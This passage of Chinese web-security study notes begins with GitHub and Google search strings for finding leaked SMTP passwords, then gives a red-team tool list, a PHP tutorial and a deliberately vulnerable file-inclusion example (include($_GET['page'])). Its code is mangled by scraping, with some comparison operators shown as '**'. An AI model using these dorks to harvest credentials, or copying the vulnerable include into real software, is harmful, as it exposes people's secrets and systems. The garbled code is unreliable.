资源搜索\n\n1234567891011121314in:name test               #仓库标题搜索含有关键字in:descripton test         #仓库描述搜索含有关键字in:readme test             #Readme文件搜素含有关键字stars:&gt;3000 test           #stars数量大于3000的搜索关键字stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键forks:&gt;1000 test           #forks数量大于1000的搜索关键字 forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字user:test                  #用户名搜素 license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 language:java test         #在java语言的代码中搜索关键字 user:test in:name test     #组合搜索,用户名test的标题含有test的\n\n关键字配合谷歌搜索\n\n1234567site:Github.com smtpsite:Github.com smtp @qq.com site:Github.com smtp @126.comsite:Github.com smtp @163.com site:Github.com smtp @sina.com.cn site:Github.com smtp password site:Github.com String password smtp\n\n语法固定长期后续监控新泄露\n\n基于关键字监控\n基于项目规则监控\nhttps://github.com/madneal/gshark\nhttps://github.com/NHPT/FireEyeGoldCrystal\nhttps://github.com/Explorer1092/Github-Monitor\n\n\n\n2.网盘资源搜索-全局文件机密\n\n主要就是查看网盘中是否存有目标的敏感文件\n如：企业招标，人员信息，业务产品，应用源码等\n\n3.敏感目录文件-目录扫描&amp;爬虫\n\n后续会写\n\n4.网络空间进阶-证书&amp;图标&amp;邮箱\n\n\n证书资产\n\n\nICO 资产\n\nfofa、quake、hunter\n\n\n\n邮箱资产\n\nhttps://hunter.io/\n\n\n\n七、红蓝队工具\n1.各类红蓝队优秀工具项目集合\n\n项目地址：https://github.com/guchangan1/All-Defense-Tool\n本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大 CMS 利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。\n\n2.自动化-武器库部署-F8x\n\n\n项目地址：https://github.com/ffffffff0x/f8x\n\n\n介绍：一款红/蓝队环境自动化部署工具, 支持多种场景, 渗透, 开发, 代理环境, 服务可选项等\n\n\n配置：\n\n\n通过 CF Workers 下载 [推荐]\nwget : wget -O f8x https://f8x.io/\ncurl : curl -o f8x https://f8x.io/\n\n\n\n\n使用：见项目文档\n\n\n3.自动化-网络空间-Asamf\n\n项目地址：https://github.com/Kento-Sec/AsamF\n介绍：\n\nAsamF 集成了 Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF 支持 Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone 配置多个 Key。\n\n\n配置：\n\nAsamF 会在~/.config/asamf/目录下生成 config.json 文件。如果你有多个 key，按照 json 的格式录入即可，建议键值按照阿拉伯数字依次录入, 方便以阿拉伯数字来切换 key。自动结果保存在~/asamf/目录下。\n\n\n使用：见文档\n\n4.自动化-企查信息-ENScan\n\n项目地址：https://github.com/wgpsec/ENScan_GO\n介绍：剑指 HW/SRC，解决在 HW/SRC 场景下遇到的各种针对国内企业信息收集难题\n配置：ENScanGo 在第一次使用时需要使用-v 命令生成配置文件信息后进行配置\n使用：见项目文档\n\n5.综合自动化项目-nemo\n\n项目地址：https://github.com/hanc00l/nemo_go\n介绍：Nemo 是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用 Golang 完全重构了原 Python 版本。\n使用：见项目文档\n\n八、思维导图\n\n安全开发\nPHP 开发\n一、PHP 基础\n\n单引号：直接输出内容\n双引号：解释变量内容\n不加引号：执行内容输出结果\n\n引号对比\n12345678&lt;?php$a=4;$b=55;echo &#x27;$a+$b&#x27;.&quot;&lt;br&gt;&quot;;echo &quot;$a+$b&quot;.&quot;&lt;br&gt;&quot;;echo $a+$b.&quot;&lt;br&gt;&quot;;?&gt; $a+$b  4+55  59  \nPHP 变量\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859函数外的变量为全局变量，函数内的变量为局部变量。函数内调用全局变量要用到global关键字。函数外不可以调用局部变量  &lt;?php$x=5;$y=10; function myTest()&#123;    global $x,$y;    $y=$x+$y;&#125; myTest();echo $y; // 输出 15?&gt;  PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。上面的实例可以写成这样：  &lt;?php$x=5;$y=10;function myTest()&#123;    $GLOBALS[&#x27;y&#x27;]=$GLOBALS[&#x27;x&#x27;]+$GLOBALS[&#x27;y&#x27;];&#125; myTest();echo $y;?&gt;  Static作用域：函数完成后值不会被删除  &lt;?phpfunction myTest()&#123;    static $x=0;    echo $x;    $x++;    echo PHP_EOL;    // 换行符&#125;myTest();myTest();myTest();?&gt;  参数作用域：传参\nPHP echo 和 print 语句\n12345678910111213141516171819202122232425262728293031323334&lt;?phpecho &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;echo &quot;Hello world!&lt;br&gt;&quot;;echo &quot;我要学 PHP!&lt;br&gt;&quot;;echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;$txt1=&quot;学习 PHP&quot;;$txt2=&quot;RUNOOB.COM&quot;;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo &quot;$txt1&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;在 $txt2 学习 PHP &quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\t$txt1=&quot;学习 PHP&quot;;$txt2=&quot;RUNOOB.COM&quot;;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); print $txt1;print &quot;&lt;br&gt;&quot;;print &quot;在 $txt2 学习 PHP &quot;;print &quot;&lt;br&gt;&quot;;print &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;?&gt;  PHP 很有趣!Hello world!我要学 PHP!这是一个字符串，使用了多个参数。学习 PHP在 RUNOOB.COM 学习 PHP 我车的品牌是 Volvo学习 PHP在 RUNOOB.COM 学习 PHP 我车的品牌是 Volvo  \nPHP 数据类型\n12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php $x = 5985;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = -345; // 负数 var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 0x8C; // 十六进制数var_dump($x);echo &quot;&lt;br&gt;&quot;;$x = 047; // 八进制数var_dump($x);$x = 10.365;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 2.4e3;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 8E-5;var_dump($x);$x=true;$y=false;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);$c = mysql_connect();echo get_resource_type($c).&quot;\\n&quot;;// 打印：mysql link$fp = fopen(&quot;foo&quot;,&quot;w&quot;);echo get_resource_type($fp).&quot;\\n&quot;;// 打印：file$doc = new_xmldoc(&quot;1.0&quot;);echo get_resource_type($doc-&gt;doc).&quot;\\n&quot;;// 打印：domxml document?&gt;\nPHP 类型比较\n\n虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较\n\n松散比较：使用两个等号 ** 比较，只比较值，不比较类型。\n严格比较：用三个等号 **= 比较，除了比较值，也比较类型。\n例如，“42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。\n\n\n\nPHP 常量\n123456bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )&lt;?php// 不区分大小写的常量名define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;, true);echo greeting;  // 输出 &quot;欢迎访问 Runoob.com&quot;?&gt;\nPHP 字符串\n12345678910111213141516171819202122232425262728并置运算符（.）&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;strlen() 函数：返回字符串长度。&lt;?phpecho strlen(&quot;Hello world!&quot;);?&gt;strpos()： 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。下面的实例在字符串 &quot;Hello world!&quot; 中查找文本 &quot;world&quot;：&lt;?phpecho strpos(&quot;Hello world!&quot;,&quot;world&quot;);?&gt;  字符串中第一个字符的位置是 0，而不是 1。\n条件语句\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475if (条件)&#123;    条件成立时要执行的代码;&#125;if (条件)&#123;条件成立时执行的代码;&#125;else&#123;条件不成立时执行的代码;&#125;if (条件)&#123;    if 条件成立时执行的代码;&#125;elseif (条件)&#123;    elseif 条件成立时执行的代码;&#125;else&#123;    条件不成立时执行的代码;&#125;&lt;?phpswitch (n)&#123;case label1:    如果 n=label1，此处代码将执行;    break;case label2:    如果 n=label2，此处代码将执行;    break;default:    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;&#125;?&gt;\n数组\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758PHP 数值数组这里有两种创建数值数组的方法：自动分配 ID 键（ID 键总是从 0 开始）：$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);人工分配 ID 键：$cars[0]=&quot;Volvo&quot;;$cars[1]=&quot;BMW&quot;;$cars[2]=&quot;Toyota&quot;;下面的实例创建一个名为 $cars 的数值数组，并给数组分配三个元素,然后打印一段包含数组值的文本：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;?&gt;获取数组的长度 - count() 函数count() 函数用于返回数组的长度（元素的数量）：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt;遍历数值数组遍历并打印数值数组中的所有值，您可以使用 for 循环，如下所示：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);$arrlength=count($cars);for($x=0;$x&lt;$arrlength;$x++)&#123;    echo $cars[$x];    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;PHP 关联数组关联数组是使用您分配给数组的指定的键的数组。这里有两种创建关联数组的方法：$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);or:$age[&#x27;Peter&#x27;]=&quot;35&quot;;$age[&#x27;Ben&#x27;]=&quot;37&quot;;$age[&#x27;Joe&#x27;]=&quot;43&quot;;随后可以在脚本中使用指定的键：实例&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;?&gt;遍历关联数组遍历并打印关联数组中的所有值，您可以使用 foreach 循环，如下所示：实例&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);foreach($age as $x=&gt;$x_value)&#123;    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;\n数组排序\n\n数组中的元素可以按字母或数字顺序进行降序或升序排列。\n\n1234567PHP - 数组排序函数:sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列\n超级全局变量\n123456789$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\nPHP 循环\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647while 循环：while 循环将重复执行代码块，直到指定的条件不成立。语法while (条件)&#123;    要执行的代码;&#125;do...while 语句：do...while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。语法do&#123;    要执行的代码;&#125;while (条件);for 循环：for 循环用于您预先知道脚本需要运行的次数的情况。语法for (初始值; 条件; 增量)&#123;    要执行的代码;&#125;参数：初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。foreach 循环：foreach 循环用于遍历数组。语法foreach ($array as $value)&#123;    要执行代码;&#125;每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。foreach ($array as $key =&gt; $value)&#123;    要执行代码;&#125;每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。\nPHP 函数\n\n如要在页面加载时执行脚本，您可以把它放到函数里。\n函数是通过调用函数来执行的。\n你可以在页面的任何位置调用函数。\nPHP 函数准则：\n\n函数的名称应该提示出它的功能\n函数名称以字母或下划线开头（不能以数字开头）\n\n\n\n123function functionName()&#123;// 要执行的代码&#125;\n\n函数（）里面可以传参数，($a,$ b); 如需让函数返回一个值，请在函数主体内使用 return 语句。\n\nPHP 魔术常量\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130__LINE__文件中的当前行号。实例&lt;?phpecho &#x27;这是第 &quot; &#x27;  . __LINE__ . &#x27; &quot; 行&#x27;;?&gt;以上实例输出结果为：这是第 “ 2 ” 行__FILE__文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。实例:实例&lt;?phpecho &#x27;该文件位于 &quot; &#x27;  . __FILE__ . &#x27; &quot; &#x27;;?&gt;以上实例输出结果为：该文件位于 “ E:\\wamp\\www\\test\\index.php ”__DIR__文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增）实例&lt;?phpecho &#x27;该文件位于 &quot; &#x27;  . __DIR__ . &#x27; &quot; &#x27;;?&gt;以上实例输出结果为：该文件位于 “ E:\\wamp\\www\\test ”__FUNCTION__函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。实例&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;&#125;test();?&gt;以上实例输出结果为：函数名为：test__CLASS__类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\\Bar）。注意自 PHP 5.4 起 __CLASS__ 对 trait 也起作用。当用在 trait 方法中时，__CLASS__ 是调用 trait 方法的类的名字。实例&lt;?phpclass test &#123;    function _print() &#123;        echo &#x27;类名为：&#x27;  . __CLASS__ . &quot;&lt;br&gt;&quot;;        echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;    &#125;&#125;$t = new test();$t-&gt;_print();?&gt;以上实例输出结果为：类名为：test函数名为：_print__TRAIT__Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP 实现了代码复用的一个方法，称为 traits。Trait 名包括其被声明的作用区域（例如 Foo\\Bar）。从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。实例&lt;?phpclass Base &#123;    public function sayHello() &#123;        echo &#x27;Hello &#x27;;    &#125;&#125; trait SayWorld &#123;    public function sayHello() &#123;        parent::sayHello();        echo &#x27;World!&#x27;;    &#125;&#125; class MyHelloWorld extends Base &#123;    use SayWorld;&#125; $o = new MyHelloWorld();$o-&gt;sayHello();?&gt;以上例程会输出：Hello World!__METHOD__类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。实例:实例&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __METHOD__ ;&#125;test();?&gt;以上实例输出结果为：函数名为：test__NAMESPACE__当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。实例:实例&lt;?phpnamespace MyProject; echo &#x27;命名空间为：&quot;&#x27;, __NAMESPACE__, &#x27;&quot;&#x27;; // 输出 &quot;MyProject&quot;?&gt;以上实例输出结果为：命名空间为：&quot;MyProject&quot;\nPHP 命名空间（namespqce）\n\nPHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP 中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。\nPHP 命名空间可以解决以下两类问题：\n\n用户编写的代码与 PHP 内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。\n为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。\n\n\n\nPHP 面向对象\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?phpclass Site &#123;  /* 成员变量 */  var $url;  var $title;    /* 成员函数 */  function setUrl($par)&#123;     $this-&gt;url = $par;  &#125;    function getUrl()&#123;     echo $this-&gt;url . PHP_EOL;  &#125;    function setTitle($par)&#123;     $this-&gt;title = $par;  &#125;    function getTitle()&#123;     echo $this-&gt;title . PHP_EOL;  &#125;&#125;$runoob = new Site;$taobao = new Site;$google = new Site;// 调用成员函数，设置标题和URL$runoob-&gt;setTitle( &quot;菜鸟教程&quot; );$taobao-&gt;setTitle( &quot;淘宝&quot; );$google-&gt;setTitle( &quot;Google 搜索&quot; );$runoob-&gt;setUrl( &#x27;www.runoob.com&#x27; );$taobao-&gt;setUrl( &#x27;www.taobao.com&#x27; );$google-&gt;setUrl( &#x27;www.google.com&#x27; );// 调用成员函数，获取标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;    &lt;?phpclass Site &#123;  /* 成员变量 */  var $url;  var $title;  function __construct( $par1, $par2 ) &#123;    $this-&gt;url = $par1;    $this-&gt;title = $par2;  &#125;  /* 成员函数 */  function setUrl($par)&#123;     $this-&gt;url = $par;  &#125;    function getUrl()&#123;     echo $this-&gt;url . PHP_EOL;  &#125;    function setTitle($par)&#123;     $this-&gt;title = $par;  &#125;    function getTitle()&#123;     echo $this-&gt;title . PHP_EOL;  &#125;&#125;$runoob = new Site(&#x27;www.runoob.com&#x27;, &#x27;菜鸟教程&#x27;);$taobao = new Site(&#x27;www.taobao.com&#x27;, &#x27;淘宝&#x27;);$google = new Site(&#x27;www.google.com&#x27;, &#x27;Google 搜索&#x27;);// 调用成员函数，获取标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;\n二、PHP 留言板功能&amp;超全局变量&amp;数据库操作\n\n\n开发环境：\n\nphpstrom：专业 php 开发 ide\nphpstudy：Apache MYSQL 环境\nNavicat：全能数据库管理工具\n\n\n\n数据库导入-mysql 架构&amp;库表列\n\n1.数据库名，数据库表名，数据库列名\n2.数据库数据，格式类型，长度，键等\n\n数据库操作-mysql 函数&amp;增删改查\n\nPHP 函数：连接，选择，执行，结果，关闭等\n参考：https://www.runoob.com/php/php-ref-mysqli.html\n\n1234567891011常用：mysqli_connect() 打开一个到MySQL的新的连接。mysqli_select_db() 更改连接的默认数据库。mysqli_query() 执行某个针对数据库的查询。mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。mysqli_close() 关闭先前打开的数据库连接。MYSQL增删改查：查：select * from 表名 where 列名=&#x27;条件&#x27;;增：insert into 表名(`列名1`, `列名2`) value(&#x27;列1值1&#x27;, &#x27;列2值2&#x27;);删：delete from 表名 where 列名 = &#x27;条件&#x27;;改：update 表名 set 列名 = 数据 where 列名 = &#x27;条件&#x27;;\n数据库接受输出-html 混编&amp;超全局变量\n\n1.html 混编：使 HTML（js）在 php 语言运行\n\n&lt;?php echo '&lt;script&gt;alert('x');&lt;/script&gt;' ?&gt;\n\n\n2.超全变量：\n\nhttps://www.w3school.com.cn/php/php_superglobals.asp\nhttps://www.php.net/manual/zh/language.variables.superglobals.php\n\n\n\n12345678$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息$_REQUEST：$_REQUEST 用于收集 HTML 表单提交的数据$_POST：广泛用于收集提交method=&quot;post&quot; 的HTML表单后的表单数据$_GET：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method=&quot;get&quot;) $_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容$_ENV：是一个包含服务器端环境变量的数组$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容$_SESSION：是一个关联数组，包含当前脚本中的所有session内容\n第三方插件引用-js 传参&amp;函数对象调用\n\n引用：&lt;script src = '../xxx.js&gt;&lt;/script&gt;'\n函数对象调用\n\n1234567891011121314151617181920var obj = &#123;    value : 0,increment : function (inc) &#123;        this.value += typeof inc **= &#x27;number&#x27; ? inc :1;//设置inc且为数字时 value=inc 反之 value=1&#125;&#125;obj.increment();console.log(obj.value); //1obj.increment(2);console.log(obj.value); //2\n三、PHP 应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性\n身份验证-cookie 使用\n\n\n生成 cookie 的原理过程：见图\n\n1.客户端向服务器发送 HTTP 请求\n2.服务器检查请求头中是否包含 cookie 信息\n3.如果请求头中包含 cookie 信息，则服务器使用该 cookie 来识别客户端，否则服务器将生成一个新的 cookie\n4.服务器在响应头中设置 cookie 信息并将其发送回客户端\n5.客户端接收响应并将 cookie 保存在本地\n6.当客户端发送下一次 HTTP 请求时，它会将 cookie 信息附加到请求头中\n7.服务器收到请求并检查 cookie 的有效性\n8.如果 cookie 有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录\n\n12setcookie()  #设置一个cookie并发送到客户端浏览器unset()      #用于删除指定的cookie\n\n\n\n身份验证-Session 使用\n\n1、客户端向服务器发送 HTTP 请求\n2、服务器为客户端生成一个唯一的 session ID，并将其存储在服务器端的存储器中（如文件、数据库等）\n3、服务器将生成的 session ID 作为一个 cookie 发送给客户端。\n4、客户端将 session ID 保存为一个 cookie，通常是在本地浏览器中存储\n5、当客户端在发送下一次 HTTP 请求时，它会将该 cookie 信息附加到请求头中，以便服务器可以通过该 session ID 来识别客户端\n6、服务器使用 session ID 来检索存储在服务器端存储器中的与该客户端相关的 session 数据，从而在客户端和服务器之间共享数据。\n\n12345session_start()    #启动会话，用于开始或恢复一个已经存在的会话$_SESSON           #用于存储和访问当前会话中的所有数据session_destroy()  #销毁当前会话中的所有数据session_unset()    #释放当前会话的所有变量Session存储路径：php.ini中session.save_path设置路径\n\n唯一性判断-Token 使用\n\n1、生成 Token 并将其存储在 Session\n2、生成 Token 并将其绑定在 Cookie 触发\n3、尝试登录表单中带入 Token 验证逻辑\n4、思考 Token 安全特性\n\n具体安全知识点\nCookie 和 Session\n\n\nCookie 和 Session 都是用来在 Web 应用程序中跟踪用户状态的机制\n\n\n1.存储位置不同：\n\nCookie 是存储在客户端（浏览器）上的，而 Session 是存储在服务器端的。\n\n\n\n2.安全性不同：\n\nCookie 存储在客户端上，可能会被黑客利用窃取信息，而 Session 存储在服务器上，更加安全。\n\n\n\n3.存储容量不同：\n\nCookie 的存储容量有限，一般为 4KB，而 Session 的存储容量理论上没有限制，取决于服务器的硬件和配置。\n\n\n\n4.生命周期不同：\n\nCookie 可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie 仍然存在，直到过期或者被删除。而 Session 一般默认在浏览器关闭后就会过期。\n\n\n\n5.访问方式不同：\n\nCookie 可以通过 JavaScript 访问，而 Session 只能在服务器端进行访问\n\n\n\n6.使用场景不同：\n\nCookie 一般用于存储小型的数据，如用户的用户名和密码等信息。而 Session 一般用于存储大型的数据，如购物车、登录状态等信息\n\n\n\n总之，Cookie 和 Session 都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用 Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用 Cookie\n\n\nToken\n\n在 Web 应用程序中，使用 token 和不使用 token 的主要差异在于身份验证和安全性。\n1.身份验证：\n\n采用 token 机制的 Web 应用程序，用户在登录成功后会收到一个 token，这个 token 可以在每次请求时发送给服务器进行身份验证。而不采用 token 机制的 Web 应用程序，一般会使用 session 机制来保存用户登录状态，服务器会在用户登录成功后创建一个 session，之后的每个请求都需要在 HTTP 头中附带这个 session ID，以便服务器能够验证用户身份。\n\n\n2.安全性：\n\n采用 token 机制的 Web 应用程序，在服务器上不会存储用户的登录状态，只需要存储 token 即可。因此，即使 token 被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用 token 机制的 Web 应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。\n\n\n3.跨域访问：\n\n采用 token 机制的 Web 应用程序，在跨域访问时，可以使用 HTTP 头中的 Authorization 字段来传递 token 信息，方便实现跨域访问。而不采用 token 机制的 Web 应用程序，在跨域访问时，需使用 cookie 或 session 来传递用户身份信息，比较麻烦。\n\n\n总之，采用 token 机制可以提高 Web 应用程序的安全性，并且方便实现跨域访问。不过，使用 token 机制也需要开发者自己来实现身份验证和 token 的生成和验证，相对来说比较复杂。而不采用 token 机制，使用 session 机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。\n\n123456789101112131415161718&lt;?phpsession_start();$token = $_COOKIE[&#x27;token&#x27;] ?? &#x27;&#x27;;if ($token !** $_SESSION[&#x27;token&#x27;]) &#123;    // token不匹配，禁止访问    header(&#x27;HTTP/1.1 403 Forbidden&#x27;);    echo &#x27;Access denied&#x27;;    exit;&#125;else&#123;    if($_POST[&#x27;username&#x27;]**&#x27;admin&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]**&#x27;123456&#x27;)&#123;        echo &#x27;登录成功!&#x27;;        echo &#x27;你是管理员可以访问文件管理页面！&#x27;;    &#125;else&#123;        echo &#x27;登录失败！&#x27;;    &#125;&#125;\n四、PHP 应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制\n文件管理模块-上传-过滤机制\n\n\n1.无过滤机制\n\n\n2.黑名单过滤机制\n\n\n3.白名单过滤机制\n\n\n4.文件类型过滤机制\n\n\n$_FILES：PHP 中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。\n\n\n123456$_FILES[&quot;表单值&quot;][&quot;name&quot;] 获取上传文件原始名称$_FILES[&quot;表单值&quot;][&quot;type&quot;]获取上传文件MIME类型$_FILES[&quot;表单值&quot;][&quot;size&quot;] 获取上传文件字节单位大小$_FILES[&quot;表单值&quot;][&quot;tmp_name&quot;] 获取上传的临时副本文件名$_FILES[&quot;表单值&quot;][&quot;error&quot;] 获取上传时发生的错误代码move_uploaded_file() 将上传的文件移动到指定位置的函数\n文件管理模块-显示-过滤机制\n功能：显示 上传 下载 删除 编辑 包含等\n\n1.打开目录读取文件列表\n2.递归循环读取文件列表\n3.判断是文件还是文件夹\n4.PHP.INI 目录访问控制\n\n123is_dir() 函数用于检查指定的路径是否是一个目录opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录\n\nopen_basedir：PHP.INI 中的设置用来控制脚本程序访问目录（把：去掉就是控制在这个目录)\n过滤 切换目录负号：…/  …\\\n\n“./”：代表目前所在的目录\n&quot; . ./&quot; 代表上一层目录\n“/”：代表根目录。\n\n\nhttps://blog.csdn.net/Young__Fan/article/details/80152501\nhttps://blog.csdn.net/weixin_44567318/article/details/116863701\n\n五、PHP 应用&amp;文件管理模块&amp;包含&amp;上传&amp;遍历&amp;写入&amp;删除&amp;下载&amp;安全\nPHP 文件操作安全\n\n文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历\n\n文件包含\n1234include()       #在错误发生后脚本继续执行require()       #在错误发生后脚本停止执行include_once()  #如果已经包含，则不再执行require_once()  #如果已经包含，则不再执行\n例：\n123include($_GET[&#x27;page&#x27;]);1.txt 内容: &lt;?php phpinfo();?&gt;x.php?page=phpinfo.php #触发文件包含漏洞，执行1.txt的代码\n文件上传\n\n无过滤机制、黑名单过滤机制、白名单过滤机制、文件类型过滤机制\n架构：\n\n1、上传至服务器本身的存储磁盘(源码在一起)\n2、云产品 OSS 